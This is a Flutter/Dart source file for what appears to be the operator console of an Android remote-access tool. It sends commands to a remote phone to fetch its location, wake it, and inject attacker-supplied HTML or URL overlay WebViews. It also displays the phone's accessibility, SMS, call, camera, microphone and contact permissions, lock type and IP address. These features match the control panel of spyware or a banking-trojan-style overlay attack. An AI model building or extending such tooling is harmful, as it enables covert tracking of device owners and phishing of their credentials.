    showDialog(context: context, builder: (ctx) => StatefulBuilder(
      builder: (ctx, setS) => Dialog(
        backgroundColor: _kCard,
        insetPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 40),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _kBorder)),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _kBg, borderRadius: const BorderRadius.vertical(top: Radius.circular(16))),
            child: Row(children: [
              Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(color: _kOrange.withOpacity(0.12), borderRadius: BorderRadius.circular(8)), child: const Icon(Icons.web_rounded, color: _kOrange, size: 18)),
              const SizedBox(width: 10),
              const Expanded(child: Text('Overlay WebView', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 15))),
              Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3), decoration: BoxDecoration(color: _kOrange.withOpacity(0.1), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kOrange.withOpacity(0.3))), child: const Text('16:9', style: TextStyle(color: _kOrange, fontSize: 10, fontWeight: FontWeight.bold))),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.fromLTRB(12, 10, 12, 4),
            child: Row(children: [
              _tabPill('HTML', 0, tab, _kOrange, () => setS(() => tab = 0)),
              const SizedBox(width: 8),
              _tabPill('URL', 1, tab, _kOrange, () => setS(() => tab = 1)),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 12),
            child: tab == 0
              ? Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  SingleChildScrollView(scrollDirection: Axis.horizontal, child: Row(
                    children: templates.keys.map((t) => Padding(padding: const EdgeInsets.only(right: 6, bottom: 8),
                      child: GestureDetector(onTap: () => setS(() => htmlCtrl.text = templates[t]!),
                        child: Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                          decoration: BoxDecoration(color: _kOrange.withOpacity(0.08), borderRadius: BorderRadius.circular(20), border: Border.all(color: _kOrange.withOpacity(0.3))),
                          child: Text(t, style: const TextStyle(color: _kOrange, fontSize: 11)))))).toList())),
                  Container(height: 200, decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder)),
                    child: TextField(controller: htmlCtrl, maxLines: null, expands: true,
                      style: const TextStyle(color: Color(0xFF10B981), fontSize: 11, fontFamily: 'monospace'),
                      decoration: const InputDecoration(hintText: '<!DOCTYPE html>...', hintStyle: TextStyle(color: Colors.white24, fontSize: 11), contentPadding: EdgeInsets.all(10), border: InputBorder.none))),
                ])
              : Column(children: [
                  const SizedBox(height: 8),
                  TextField(controller: urlCtrl, style: const TextStyle(color: Colors.white, fontSize: 13),
                    decoration: InputDecoration(hintText: 'https://google.com', hintStyle: const TextStyle(color: _kSub), prefixIcon: const Icon(Icons.link_rounded, color: _kOrange, size: 18),
                      filled: true, fillColor: _kBg, border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide.none))),
                ]),
          ),
          Padding(padding: const EdgeInsets.all(12), child: Row(children: [
            Expanded(child: GestureDetector(
              onTap: () { Navigator.pop(ctx); final c = tab == 0 ? htmlCtrl.text : urlCtrl.text.trim(); if (c.isNotEmpty) _exec('OVERLAY_WV_ADD', args: c, label: 'Overlay Add'); },
              child: Container(padding: const EdgeInsets.symmetric(vertical: 13), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kOrange, Color(0xFFD97706)]), borderRadius: BorderRadius.circular(10)),
                child: const Center(child: Text('Add Overlay', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700)))),
            )),
            const SizedBox(width: 8),
            GestureDetector(
              onTap: () { Navigator.pop(ctx); _exec('OVERLAY_WV_CLEAR', label: 'Overlay Clear'); },
              child: Container(padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13), decoration: BoxDecoration(color: _kRed.withOpacity(0.12), borderRadius: BorderRadius.circular(10), border: Border.all(color: _kRed.withOpacity(0.3))),
                child: const Text('Clear', style: TextStyle(color: _kRed, fontWeight: FontWeight.w700))),
            ),
          ])),
        ]),
      ),
    ));
  }

  Future<void> _openMaps() async {
    _addLog('Fetching location...');
    await _api.sendCommand(widget.deviceId, 'GET_LOCATION');
    for (int i = 0; i < 10; i++) {
      await Future.delayed(const Duration(seconds: 1));
      final r = await _api.getLastResponse(widget.deviceId);
      if (r != null) {
        final c = r['content']?.toString() ?? '';
        final lat = RegExp(r'Lat:\s*([\d.\-]+)').firstMatch(c);
        final lng = RegExp(r'Long:\s*([\d.\-]+)').firstMatch(c);
        if (lat != null && lng != null) {
          await launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=${lat.group(1)},${lng.group(1)}'), mode: LaunchMode.externalApplication);
          return;
        }
      }
    }
    _addLog('Location timeout.');
  }

  void _dialog(String title, IconData icon, Color color, List<Widget> children) {
    showDialog(context: context, builder: (ctx) => Dialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _kBorder)),
      child: Padding(padding: const EdgeInsets.all(20), child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(10), border: Border.all(color: color.withOpacity(0.3))), child: Icon(icon, color: color, size: 18)),
          const SizedBox(width: 10),
          Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 16))),
        ]),
        const SizedBox(height: 16),
        ...children,
      ])),
    ));
  }

  Widget _field(TextEditingController c, String hint, IconData icon) => TextField(
    controller: c,
    style: const TextStyle(color: Colors.white, fontSize: 14),
    decoration: InputDecoration(
      hintText: hint, hintStyle: TextStyle(color: Colors.white.withOpacity(0.25)),
      prefixIcon: Icon(icon, color: _kBlue, size: 18),
      filled: true, fillColor: _kBg,
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide.none),
      enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide(color: _kBorder)),
      focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: _kBlue, width: 1.5)),
    ),
  );

  Widget _btn(String label, VoidCallback onPressed, {Color color = _kCyan}) => GestureDetector(
    onTap: onPressed,
    child: Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 13),
      decoration: BoxDecoration(
        gradient: color != _kSub ? LinearGradient(colors: [color, Color.lerp(color, Colors.black, 0.2)!]) : null,
        color: color == _kSub ? _kBg : null,
        borderRadius: BorderRadius.circular(10),
        border: color == _kSub ? Border.all(color: _kBorder) : null,
      ),
      child: Center(child: Text(label, style: TextStyle(color: color == _kSub ? _kSub : Colors.white, fontWeight: FontWeight.w700, fontSize: 13))),
    ),
  );

  Widget _sectionLabel(String t) => Padding(padding: const EdgeInsets.only(bottom: 4),
    child: Text(t, style: const TextStyle(color: _kSub, fontSize: 11, fontWeight: FontWeight.w700)));

  Widget _lockTile(StateSetter setS, String title, String sub, bool val, ValueChanged<bool?> onChange) => Theme(
    data: ThemeData.dark(),
    child: CheckboxListTile(
      value: val, onChanged: (v) => setS(() => onChange(v)),
      title: Text(title, style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
      subtitle: Text(sub, style: const TextStyle(color: _kSub, fontSize: 10)),
      contentPadding: EdgeInsets.zero, activeColor: _kRed, dense: true,
    ),
  );

  Widget _tabPill(String label, int idx, int cur, Color color, VoidCallback onTap) {
    final sel = idx == cur;
    return GestureDetector(onTap: onTap, child: AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 7),
      decoration: BoxDecoration(
        gradient: sel ? LinearGradient(colors: [color, Color.lerp(color, Colors.black, 0.2)!]) : null,
        color: sel ? null : Colors.transparent,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: sel ? Colors.transparent : _kBorder),
      ),
      child: Text(label, style: TextStyle(color: sel ? Colors.white : _kSub, fontWeight: sel ? FontWeight.w700 : FontWeight.normal, fontSize: 12)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final cats = _categories;
    final cat  = cats[_tabIdx.clamp(0, cats.length - 1)];
    final btns = cat['buttons'] as List<Map<String, dynamic>>;
    final catColor = cat['color'] as Color;

    return Scaffold(
      backgroundColor: _kBg,
      body: SafeArea(
        child: Column(children: [
          _buildHero(),
          _buildStats(),
          _buildLogStrip(),
          Container(
            padding: const EdgeInsets.fromLTRB(16, 10, 16, 4),
            child: Row(children: [
              Container(padding: const EdgeInsets.all(6), decoration: BoxDecoration(gradient: LinearGradient(colors: [catColor, Color.lerp(catColor, Colors.black, 0.25)!]), borderRadius: BorderRadius.circular(8)),
                child: Icon(cat['icon'] as IconData, color: Colors.white, size: 14)),
              const SizedBox(width: 8),
              Text(cat['title'] as String, style: TextStyle(color: catColor, fontWeight: FontWeight.w700, fontSize: 14)),
              const SizedBox(width: 6),
              const Text('·', style: TextStyle(color: _kSub)),
              const SizedBox(width: 6),
              Text(cat['desc'] as String, style: const TextStyle(color: _kSub, fontSize: 11)),
              const Spacer(),
              Text('${btns.length} actions', style: const TextStyle(color: _kSub, fontSize: 10)),
            ]),
          ),
          Expanded(
            child: ListView.builder(
              padding: const EdgeInsets.fromLTRB(14, 4, 14, 80),
              physics: const BouncingScrollPhysics(),
              itemCount: btns.length,
              itemBuilder: (_, i) => _buildCommand(btns[i], catColor),
            ),
          ),
        ]),
      ),
      bottomNavigationBar: _buildBottomNav(cats),
    );
  }

  Widget _buildHero() {
    final isOnline = _status.toLowerCase().contains('online');
    final statusCol = isOnline ? _kGreen : _kRed;

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _kCard,
        border: Border(bottom: BorderSide(color: _kBorder.withOpacity(0.5))),
      ),
      child: Column(
        children: [
          Row(children: [
            GestureDetector(
              onTap: () => Navigator.pop(context),
              child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.04), borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder)),
                child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
            ),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(_phoneName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 18)),
              Text(widget.deviceId, style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 11), overflow: TextOverflow.ellipsis),
            ])),
            GestureDetector(
              onTap: _refresh,
              child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.04), borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder)),
                child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18)),
            ),
          ]),
          const SizedBox(height: 16),
          // ── Status Card ──
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [statusCol.withOpacity(0.15), statusCol.withOpacity(0.05)]),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: statusCol.withOpacity(0.3)),
            ),
            child: Row(children: [
              Container(
                width: 48, height: 48,
                decoration: BoxDecoration(color: statusCol.withOpacity(0.1), shape: BoxShape.circle),
                child: Icon(isOnline ? Icons.sensors_rounded : Icons.sensors_off_rounded, color: statusCol, size: 24),
              ),
              const SizedBox(width: 16),
              Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text(isOnline ? "DEVICE ONLINE" : "DEVICE OFFLINE", style: TextStyle(color: statusCol, fontWeight: FontWeight.bold, fontSize: 13, letterSpacing: 1)),
                Text(_status.toUpperCase(), style: TextStyle(color: statusCol.withOpacity(0.7), fontSize: 10, fontWeight: FontWeight.w600)),
              ])),
              _btnMini("WAKEUP", () => _exec("WAKEUP", label: "Wakeup Device"), color: statusCol),
            ]),
          ),
        ],
      ),
    );
  }

  Widget _btnMini(String label, VoidCallback onTap, {Color color = _kBlue}) => GestureDetector(
    onTap: onTap,
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8), border: Border.all(color: color.withOpacity(0.3))),
      child: Text(label, style: TextStyle(color: color, fontSize: 9, fontWeight: FontWeight.bold)),
    ),
  );

  Widget _buildStats() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(height: 12),
          _sectionLabel("DEVICE SPECIFICATIONS"),
          const SizedBox(height: 8),
          SingleChildScrollView(
            scrollDirection: Axis.horizontal,
            child: Row(children: [
              _statChip(Icons.battery_std_rounded, _batteryLevel, _kOrange),
              const SizedBox(width: 8),
              _statChip(Icons.android_rounded, "Ver $_androidVer", _kGreen),
              const SizedBox(width: 8),
              _statChip(Icons.lock_rounded, _lockType, _kPurple),
              const SizedBox(width: 8),
              _statChip(Icons.public_rounded, _ipAddress.length > 15 ? 'IP HIDDEN' : _ipAddress, _kCyan),
            ]),
          ),
          const SizedBox(height: 16),
          _sectionLabel("PERMISSIONS STATUS"),
          const SizedBox(height: 8),
          _buildPermissionGrid(),
        ],
      ),
    );
  }

  Widget _buildPermissionGrid() {
    final keys = ['ACC', 'CAM', 'MIC', 'LOC', 'STO', 'CON', 'SMS', 'CAL'];
    final labels = {'ACC': 'Accessibility', 'CAM': 'Camera', 'MIC': 'Mic', 'LOC': 'Location', 'STO': 'Storage', 'CON': 'Contacts', 'SMS': 'SMS', 'CAL': 'Calls'};
    
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: keys.map((k) {
        final granted = _permissions[k] == true;
        final col = granted ? _kGreen : _kRed;
        return Container(
          width: (MediaQuery.of(context).size.width - 48) / 3,
          padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 10),
          decoration: BoxDecoration(
            color: col.withOpacity(0.05),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: col.withOpacity(0.2)),
          ),
          child: Row(children: [
            Icon(granted ? Icons.check_circle_rounded : Icons.cancel_rounded, color: col, size: 14),
            const SizedBox(width: 6),
            Expanded(child: Text(labels[k] ?? k, style: TextStyle(color: col, fontSize: 10, fontWeight: FontWeight.w600), overflow: TextOverflow.ellipsis)),
          ]),
        );
      }).toList(),
    );
  }

  Widget _statChip(IconData icon, String txt, Color color) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 4),
    decoration: BoxDecoration(color: color.withOpacity(0.08), borderRadius: BorderRadius.circular(8), border: Border.all(color: color.withOpacity(0.2))),
    child: Row(mainAxisSize: MainAxisSize.min, children: [Icon(icon, color: color, size: 11), const SizedBox(width: 4), Text(txt, style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.w600))]),
  );

  Widget _buildLogStrip() => Column(children: [
    GestureDetector(
      onTap: () => setState(() => _showLog = !_showLog),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 7),
        decoration: BoxDecoration(color: _kBg, border: Border(bottom: BorderSide(color: _kBorder.withOpacity(0.5)))),
        child: Row(children: [
          const Icon(Icons.receipt_long_rounded, color: _kSub, size: 12),
          const SizedBox(width: 6),
          const Text('Activity Log', style: TextStyle(color: _kSub, fontSize: 10, fontWeight: FontWeight.w600)),
          if (_log.isNotEmpty) ...[
            const SizedBox(width: 8),
            Container(padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1), decoration: BoxDecoration(color: _kBlue.withOpacity(0.15), borderRadius: BorderRadius.circular(4)), child: Text('${_log.length}', style: const TextStyle(color: _kBlue, fontSize: 9, fontWeight: FontWeight.bold))),
          ],
          const Spacer(),
          if (_log.isNotEmpty) GestureDetector(onTap: () => setState(() => _log.clear()), child: const Text('Clear', style: TextStyle(color: _kSub, fontSize: 10))),
          const SizedBox(width: 8),
          Icon(_showLog ? Icons.keyboard_arrow_up_rounded : Icons.keyboard_arrow_down_rounded, color: _kSub, size: 16),
        ]),
      ),
    ),
    if (_showLog) Container(
      height: 80, color: _kBg,
      child: _log.isEmpty ? const Center(child: Text('No activity yet', style: TextStyle(color: _kSub, fontSize: 11)))
        : ListView.builder(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
            itemCount: _log.length,
            itemBuilder: (_, i) => Text(_log[i]['msg'], style: TextStyle(color: _log[i]['sys'] == true ? _kSub : _kCyan, fontSize: 10), maxLines: 1, overflow: TextOverflow.ellipsis),
          ),
    ),
  ]);

  Widget _buildCommand(Map<String, dynamic> b, Color c) {
    final bool isToggle = b['isToggle'] == true;
    final color = (b['color'] as Color?) ?? c;
    final label = b['label'] as String;
    final isLoading = _executing[label] == true || _executing[b['command']] == true;

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBorder.withOpacity(0.5))),
      child: ListTile(
        onTap: (isToggle || isLoading) ? null : () => _exec(b['command'] ?? '', args: b['args'], label: label, onTap: b['onTap']),
        leading: Container(
          padding: const EdgeInsets.all(8), 
          decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(10)),
          child: isLoading 
            ? SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: color))
            : Icon(b['icon'] as IconData, color: color, size: 20),
        ),
        title: Text(label, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 13)),
        subtitle: Text(b['sub'] as String, style: TextStyle(color: _kSub.withOpacity(0.7), fontSize: 11)),
        trailing: isToggle ? Switch(value: b['value'] as bool, onChanged: (v) => (b['onToggle'] as Function(bool))(v), activeColor: _kGreen)
          : Icon(isLoading ? Icons.hourglass_empty_rounded : Icons.chevron_right_rounded, color: _kSub.withOpacity(0.3), size: 18),
      ),
    );
  }


  Widget _buildBottomNav(List<Map<String, dynamic>> cats) => Container(
    decoration: BoxDecoration(color: _kCard, border: Border(top: BorderSide(color: _kBorder)), boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20, offset: const Offset(0, -4))]),
    child: SafeArea(
      top: false,
      child: SizedBox(height: 62, child: SingleChildScrollView(scrollDirection: Axis.horizontal, physics: const BouncingScrollPhysics(), padding: const EdgeInsets.symmetric(horizontal: 8),
        child: Row(children: cats.asMap().entries.map((e) {
          final i = e.key; final cat = e.value; final sel = i == _tabIdx; final col = cat['color'] as Color;
          return GestureDetector(
            onTap: () => setState(() => _tabIdx = i),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200), margin: const EdgeInsets.symmetric(horizontal: 4, vertical: 8), padding: const EdgeInsets.symmetric(horizontal: 14),
              decoration: BoxDecoration(gradient: sel ? LinearGradient(colors: [col.withOpacity(0.2), col.withOpacity(0.05)]) : null, color: sel ? null : Colors.transparent, borderRadius: BorderRadius.circular(10), border: Border.all(color: sel ? col.withOpacity(0.5) : Colors.transparent, width: 1.2)),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, mainAxisSize: MainAxisSize.min, children: [Icon(cat['icon'] as IconData, color: sel ? col : _kSub, size: 18), const SizedBox(height: 2), Text(cat['title'] as String, style: TextStyle(color: sel ? col : _kSub, fontSize: 9, fontWeight: sel ? FontWeight.w700 : FontWeight.normal))]),
            ),
          );
        }).toList()),
      )),
    ),
  );
}
